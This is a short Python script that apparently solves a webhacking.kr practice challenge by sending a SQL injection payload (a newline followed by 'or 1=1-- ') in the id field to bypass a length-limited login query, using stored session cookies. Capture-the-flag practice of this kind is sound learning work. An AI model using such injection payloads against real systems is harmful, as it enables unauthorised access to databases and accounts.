import requests
from phpsessid import cookies

# select 1 from member where length(id)<14 and id=' 

url = 'https://webhacking.kr/challenge/bonus-10/index.php'
data = {'id':'\r\n or 1=1-- '}

response = requests.get(url, cookies=cookies, data=data)
print(response.text)

